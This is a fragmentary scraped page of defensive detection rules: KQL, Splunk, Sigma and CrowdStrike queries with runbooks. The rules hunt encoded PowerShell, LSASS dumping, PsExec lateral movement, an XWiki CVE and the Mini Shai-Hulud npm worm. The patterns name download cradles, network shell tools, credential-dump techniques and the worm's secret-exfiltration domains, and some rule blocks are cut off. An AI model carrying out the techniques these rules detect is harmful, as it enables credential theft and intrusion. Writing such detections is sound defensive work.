  • Yamcs or its JVM plugins legitimately fetching telemetry/config over HTTPS via a shell helper
  • Java app update checks shelling out to curl against a vendor endpoint
  • Monitoring agents (java parent) posting metrics to a SaaS collector
  • Operator-run diagnostic curl from a Yamcs-associated service account
  • Container init scripts (java entrypoint) pulling assets at startup
Suppression filter
| where not (RemoteUrl has_any ("yamcs.org","ubuntu.com","debian.org") or InitiatingProcessCommandLine has_any ("apt","yum","update-check"))
Response runbook
1) TRIAGE: Resolve the RemoteIP/RemoteUrl and check reputation; inspect InitiatingProcessCommandLine for embedded `hostname`/`whoami`/`$()` substitution indicating recon exfil. Note whether the destination is a known webhook/paste/tunnel service. 2) CONTAIN: Block the destination IP/domain egress, isolate the host, and kill the curl/shell process. Rotate Yamcs service credentials. 3) HUNT: Walk back to the parent JVM tree (UC1) and the originating PATCH (UC2); enumerate all outbound destinations from the host over the prior 7 days and check other Yamcs instances in the fleet for the same callback domain.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessParentFileName in~ ("java","java.exe","yamcsd","yamcs")
| where InitiatingProcessFileName in~ ("curl","wget","bash","sh","python","python3","nc","ncat")
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
| order by Timestamp desc

| where (FileName in~ ("simulator.py"))
| project TimeGenerated, DeviceName, AccountName, FileName,

          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated desc

// File-creation events for the named binaries / paths
DeviceFileEvents
| where TimeGenerated > ago(30d)
| where ActionType in ("FileCreated","FileModified")
| where (FileName in~ ("simulator.py"))
| project TimeGenerated, DeviceName, AccountName, FolderPath,
          FileName, ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by TimeGenerated desc

title: Obfuscated / Encoded PowerShell Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
status: experimental
description: |
    PowerShell launched with -EncodedCommand, base64 strings, hidden
    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
    .WebClient.DownloadString — combinations indicating evasion.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1027/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1027
    - attack.execution
    - attack.defense-evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_args:
        CommandLine|contains:
            - '-enc '
            - 'EncodedCommand'
            - 'FromBase64String'
            - 'Invoke-Expression'
            - 'IEX('
            - 'DownloadString'
            - 'Net.WebClient'
            - '-w hidden'
            - '-WindowStyle Hidden'
            - '-nop'
            - '-NoProfile'
            - '-ep bypass'
            - '-ExecutionPolicy Bypass'
    condition: selection_image and selection_args
falsepositives:
    - DevOps tooling that legitimately uses encoded command for
      cross-shell escaping
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")

    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

DeviceFileEvents
| where Timestamp > ago(1d)

| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

level: high

    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents

| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")

| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,

| order by TimeGenerated desc

id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03

    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1003.001
    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\SearchProtocolHost.exe'
    condition: selection and not filter_known_good
falsepositives:
    - Third-party EDR / forensic tools — extend the filter list
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")

SecurityEvent

| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"

| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,

| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b") or SHA1 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b") or MD5 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b") or SHA1 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b") or MD5 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "7c12d8614c624c70d6dd6fc2ee289332474abaa38f70ebe2cdef064923ca3a9b"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-8398")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-8398")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve

    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve

falsepositives:

level: critical

XWiki unauthenticated XAR import via REST POST /rest/wikis/{wikiName} (CVE-2026-33137) AIExploitation High
Hunts successful, unauthenticated HTTP POST requests to the XWiki REST XAR-import endpoint (/xwiki/rest/wikis/{wikiName}[/]) that return 2xx, which is exactly the exploitation primitive in CVE-2026-33137 — the import runs with no auth/authz check, letting an attacker create or update wiki documents. The Authorization-header-absent + 2xx-status combination separates exploitation from legitimate authenticated XAR imports performed by admins/migration tooling. Rationale: Built directly on the advisory's exact exploitation primitive — POST to /wikis/{wikiName} performing a XAR import with no auth check. Confirmed via XWiki docs/dev list that the real path is /xwiki/rest/wikis/{wikiName} (POST, optional ?backup=&history= params, XAR in body), so the regex on /rest/wikis/<single-segment> plus 2xx plus absent Authorization header is high-fidelity for unauthenticated exploitation vs legitimate authenticated imports. Cross-checked against: • https://github.com/advisories/GHSA-qrvh-r3f2-9h4r • https://jira.xwiki.org/browse/XWIKI-23953 • https://www.xwiki.org/xwiki/bin/view/Documentation/UserGuide/Features/XWikiRESTfulAPI • https://devs.xwiki.narkive.com/KEuNSQkQ/xwiki-vote-add-rest-api-to-import-a-xar-file
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authenticated admins or content-migration tooling legitimately importing XAR packages (will carry an Authorization header or session cookie, suppressed by the isempty filter)
  • Backup/restore or CI automation using a service account against /rest/wikis with basic auth
  • Vulnerability scanners (Nessus/Qualys/Nuclei) probing the endpoint — typically non-2xx, especially post-patch
  • Health-check/uptime monitors hitting /rest/wikis with GET (filtered out by POST predicate)
  • Internal XWiki cluster sync or scheduled jobs originating from RFC1918 source IPs
Suppression filter
| where isempty(HttpRequestHeaderAuthorization) and not(ipv4_is_private(SrcIpAddr))   // keep only external, unauthenticated import attempts
Response runbook
1) Triage: pull the full matched request — source IP, User-Agent, request body size (a real XAR is a non-trivial zip), and confirm no Authorization header was present and the source is external; verify the XWiki version is in a vulnerable range (>=15.10.6 <16.10.17, 17.x <17.4.9/<17.10.3, 18.0.0-rc <18.1.0-rc-1). 2) Contain: block the source IP at the proxy/WAF and apply the vendor workaround (proxy rule denying POST to /wikis/{wikiName}[/]); fast-track patching to 16.10.17 / 17.4.9 / 17.10.3 / 18.0.1 / 18.1.0-rc-1. 3) Hunt: in XWiki admin enumerate documents created/updated at the request timestamp; inspect new pages for Groovy/Velocity script macros (RCE follow-on) and rogue admin/user objects; review the Tomcat/java process tree on the XWiki host for spawned shells.
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "POST"
| where Url matches regex @"(?i)/rest/wikis/[^/?#]+/?($|\?)"   // /xwiki/rest/wikis/{wikiName}[/] XAR-import endpoint
| where tostring(HttpStatusCode) in ("200","202")            // import accepted/succeeded
| where isempty(HttpRequestHeaderAuthorization)              // CVE-2026-33137: import runs with NO auth header
| project TimeGenerated, SrcIpAddr, DvcHostname, HttpMethod, Url, HttpStatusCode, HttpRequestHeaderUserAgent, HttpRequestBodyBytes
| order by TimeGenerated desc

Mini Shai-Hulud npm worm C2/exfil egress (masscan.cloud, git-tanstack.com, getsession.org) AIActions on Objectives High
Hunts outbound DNS/network connections to the Mini Shai-Hulud (TeamPCP) worm's confirmed exfiltration infrastructure used after a poisoned npm/PyPI package executes its install-time payload. These domains are credential dead-drops, not legitimate developer endpoints, so any resolution is high-fidelity. Rationale: Uses the article's extracted domains (api.masscan.cloud, git-tanstack.com, filev2/seed1.getsession.org) plus the corroborated zero.masscan.cloud:443/v1/telemetry exfil endpoint. StepSecurity/Wiz/OX/Splunk all confirm these as TeamPCP/Mini Shai-Hulud C2-dead-drop infra; VPC flow lacks domain names so cloudwatch is empty. Cross-checked against: • https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem • https://www.wiz.io/blog/mini-shai-hulud-strikes-again-tanstack-more-npm-packages-compromised • https://www.ox.security/blog/lightning-python-package-shai-hulud-supply-chain-attack/ • https://www.splunk.com/en_us/blog/security/npm-supply-chain-attack-detection-analysis.html
ATT&CKT1071.001 T1567
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A developer legitimately running the Session messenger desktop client (resolves seed1/filev2.getsession.org) — verify the initiating process is a Session client, not node/npm
  • Security researcher detonating the malware in a sandbox that egresses to the lab's own DNS
  • Threat-intel enrichment/EDR sandbox sending these domains to a DNS sinkhole
  • Typosquat-monitoring tooling that proactively resolves git-tanstack.com
Suppression filter
| where InitiatingProcessFileName !in~ ("session.exe","session","session-desktop")
Response runbook
1) Triage: identify the initiating process — if node/npm/npx/bun/python resolved the domain, treat as active compromise; pull the install log and recently modified package.json/package-lock.json. 2) Contain: isolate the host, revoke and rotate ALL developer credentials reachable from it (GitHub PAT, npm token, AWS keys, Vault tokens, SSH keys) since the worm harvests broadly. 3) Hunt: pivot on the same host for the gh-token-monitor persistence daemon, connections to 169.254.169.254/127.0.0.1:8200, and new/modified .github/workflows files; check npm/registry audit logs for any package published from this machine's tokens.

| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc

| where DnsQuery has_any ("masscan.cloud","git-tanstack.com","getsession.org")
| project TimeGenerated, SrcIpAddr, SrcHostname, SrcUsername, DnsQuery, DnsResponseName
| order by TimeGenerated desc

Package-manager process harvesting cloud metadata / Vault (IMDS 169.254.169.254, ECS 169.254.170.2, Vault :8200) AIActions on Objectives Medium
Hunts node/npm/npx/bun/yarn/pnpm or python reaching the AWS/ECS instance-metadata endpoints or a local HashiCorp Vault listener — the credential-harvesting step the Mini Shai-Hulud payload performs at install time. Package managers contacting link-local metadata IPs during dependency install is anomalous. Rationale: Anchored on the corroborated network targets the StepSecurity write-up lists (169.254.169.254 IMDS, 169.254.170.2 ECS/Fargate creds, 127.0.0.1:8200 Vault) scoped to JS/Python package-manager parents, which is the worm's credential-access step. Sentinel ASIM network has no process field so this is best-effort and noisier there. Cross-checked against: • https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem • https://snyk.io/blog/tanstack-npm-packages-compromised/
ATT&CKT1552.005 T1528
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: high — model-assessed, tune to your environment
  • Node/Python application servers legitimately running on EC2/ECS that fetch IMDS via AWS SDK credential providers
  • CI runners that read instance role credentials at job start
  • Apps using Vault Agent on 127.0.0.1:8200 for secret injection
  • IMDSv2 token-fetch traffic from aws-sdk during normal operation
  • Container init scripts probing 169.254.170.2 for task role creds
Suppression filter
| where DeviceName !has_any ("prod","ci","runner","ecs","k8s")
Response runbook
1) Triage: confirm whether the host is genuinely a server/CI runner (IMDS is normal there) vs a developer laptop (IMDS access is highly abnormal); inspect the parent command line for an in-progress `npm install`/`bun install`. 2) Contain: if a dev workstation, isolate and rotate any cloud role creds, Vault tokens, and registry tokens that the process could have read. 3) Hunt: correlate with egress to masscan.cloud/git-tanstack.com/getsession.org within the same session and check for the gh-token-monitor persistence daemon.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where (RemoteIP in ("169.254.169.254","169.254.170.2")) or (RemoteIP == "127.0.0.1" and RemotePort == 8200)
| where InitiatingProcessFileName has_any ("node.exe","node","npm","npm-cli.js","npx","bun.exe","bun","yarn","pnpm","python.exe","python","python3")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort
| order by Timestamp desc

| project TimeGenerated, SrcIpAddr, SrcHostname, SrcUsername, DstIpAddr, DstPortNumber, NetworkApplicationProtocol
| order by TimeGenerated desc

#event_simpleName=NetworkConnectIP4

| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count())

| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where (All_Traffic.dest IN ("169.254.169.254","169.254.170.2") OR (All_Traffic.dest="127.0.0.1" AND All_Traffic.dest_port=8200)) AND All_Traffic.app IN ("node","node.exe","npm","npx","bun","bun.exe","yarn","pnpm","python","python3") by All_Traffic.src All_Traffic.app All_Traffic.dest All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where (All_Traffic.dest IN ("169.254.169.254","169.254.170.2") OR (All_Traffic.dest="127.0.0.1" AND All_Traffic.dest_port=8200)) AND All_Traffic.app IN ("node","node.exe","npm","npx","bun","bun.exe","yarn","pnpm","python","python3") by All_Traffic.src All_Traffic.app All_Traffic.dest All_Traffic.dest_port
| `drop_dm_object_name(All_Traffic)`
| convert ctime(firstTime) ctime(lastTime)
Mini Shai-Hulud 'gh-token-monitor' persistence daemon (LaunchAgent / systemd) AIInstallation High
Hunts creation of the worm's confirmed persistence component — a gh-token-monitor daemon installed as a macOS LaunchAgent or Linux systemd unit that polls GitHub every 60 seconds with stolen tokens. The filename string is a direct, high-fidelity IOC. Rationale: Direct match on the corroborated persistence-component name 'gh-token-monitor' and its LaunchAgent/systemd install locations from the StepSecurity attribution; the literal daemon name makes this near-zero-FP. Endpoint-only, so cloudwatch is empty. Cross-checked against: • https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem • https://thehackernews.com/2026/05/mini-shai-hulud-worm-compromises.html
ATT&CKT1543.001 T1543.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A legitimately-named internal automation script that happens to contain 'token-monitor' (verify exact 'gh-token-monitor' string)
  • Security tooling that creates honeyfiles with decoy names for canary detection
  • Developer-authored GitHub token-refresh helper installed as a LaunchAgent
  • Sandbox/IR replay of the malware sample writing the file
Response runbook
1) Triage: read the daemon's plist/unit file and the script it points at — confirm the 60-second GitHub polling loop and exfil URL; identify which user installed it and when. 2) Contain: unload/disable the LaunchAgent or systemd unit, delete the daemon, isolate the host, and immediately revoke the GitHub PAT(s) it polls with. 3) Hunt: enumerate other hosts with the same daemon, review GitHub audit log for token reuse from new IPs, and search egress logs for the masscan.cloud/getsession.org exfil domains from the same hosts.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FileName has "gh-token-monitor"
   or (FolderPath has_any ("LaunchAgents","LaunchDaemons","/etc/systemd/system",".config/systemd") and FileName has "token")
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName has "gh-token-monitor" or TargetFilePath has "gh-token-monitor"
   or (TargetFilePath has_any ("LaunchAgents","LaunchDaemons","/etc/systemd/system",".config/systemd") and TargetFileName has "token")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName
| order by TimeGenerated desc

description: Detects the Mini Shai-Hulud worm installing its gh-token-monitor LaunchAgent/systemd persistence daemon.
references:
  - https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem
author: SOC Detection Engineering
date: 2026/05/27
tags:
  - attack.t1543.001
  - attack.t1543.002
logsource:
  category: file_event
  product: linux
detection:
  selection:
    TargetFilename|contains: 'gh-token-monitor'
  condition: selection
level: high
source:linux.auditd (@process.command_line:*gh-token-monitor* OR @process.name:gh-token-monitor OR @process.command_line:(*"launchctl load"*gh-token* OR *"systemctl enable"*gh-token*))
#event_simpleName=FileWritten
| TargetFileName=/gh-token-monitor/i
| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where (Filesystem.file_name="*gh-token-monitor*" OR (Filesystem.file_path IN ("*LaunchAgents*","*LaunchDaemons*","*/etc/systemd/system/*","*.config/systemd/user/*") AND Filesystem.file_name="*token*")) by Filesystem.dest Filesystem.file_name Filesystem.file_path
| `drop_dm_object_name(Filesystem)`
| convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where (Filesystem.file_name="*gh-token-monitor*" OR (Filesystem.file_path IN ("*LaunchAgents*","*LaunchDaemons*","*/etc/systemd/system/*","*.config/systemd/user/*") AND Filesystem.file_name="*token*")) by Filesystem.dest Filesystem.file_name Filesystem.file_path
| `drop_dm_object_name(Filesystem)`
| convert ctime(firstTime) ctime(lastTime)
npm/bun process writing GitHub Actions workflow files (worm secret-exfil injection) AIActions on Objectives Medium
Hunts a JS package-manager process (node/npm/npx/bun/yarn/pnpm) creating or modifying files under .github/workflows — the Mini Shai-Hulud worm injects a malicious workflow that serializes repo secrets via toJSON(secrets) and posts them to api.masscan.cloud, enabling self-propagation through CI. Rationale: Targets the corroborated propagation mechanism (injected GitHub Actions workflow serializing toJSON(secrets) to api.masscan.cloud) by flagging package-manager processes writing workflow YAML — file content isn't in EDR file telemetry, so the parent-process + path combo is the pivot. Endpoint-only; cloudwatch empty. Cross-checked against: • https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem • https://www.ox.security/blog/lightning-python-package-shai-hulud-supply-chain-attack/ • https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/
ATT&CKT1195.002 T1552.001
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Project scaffolders/generators run via npx (e.g. create-react-app, nx, turbo) that legitimately write starter workflows
  • A developer running a codegen tool that templates CI workflows
  • Monorepo tooling (lerna/nx/turbo) regenerating workflow files
  • Dependabot/renovate local runs editing workflow pins
Suppression filter
| where InitiatingProcessCommandLine !has_any ("create-","generate","scaffold","nx ","turbo ","lerna ")
Response runbook
1) Triage: open the written workflow YAML and grep for `toJSON(secrets)`, `api.masscan.cloud`, curl/base64 exfil steps, or an unexpected `npm publish` step; confirm it wasn't a legitimate scaffolder by checking the parent command line. 2) Contain: if malicious, revert the workflow in the repo, isolate the host, rotate GitHub Actions secrets/OIDC and any registry publish tokens, and check whether the workflow already ran in CI. 3) Hunt: search the org's repos for the same injected workflow, review npm/PyPI for packages published from affected tokens, and correlate with masscan.cloud egress and the gh-token-monitor daemon on the same host.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where (FolderPath has @"\.github\workflows" or FolderPath has "/.github/workflows")
| where FileName endswith ".yml" or FileName endswith ".yaml"
| where InitiatingProcessFileName has_any ("node.exe","node","npm","npm-cli.js","npx","bun.exe","bun","yarn","pnpm")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, FolderPath
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFilePath has @"\.github\workflows" or TargetFilePath has "/.github/workflows"
| where TargetFileName endswith ".yml" or TargetFileName endswith ".yaml"
| where ActingProcessName has_any ("node","npm","npx","bun","yarn","pnpm")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName
| order by TimeGenerated desc
title: Package Manager Writing GitHub Actions Workflow (Mini Shai-Hulud Injection)
id: a4e8b91c-7d2f-4c63-8b1a-9e0d3f2c6a55
description: Detects node/npm/bun writing .github/workflows files, the Mini Shai-Hulud worm's secret-exfil self-propagation injection.
references:
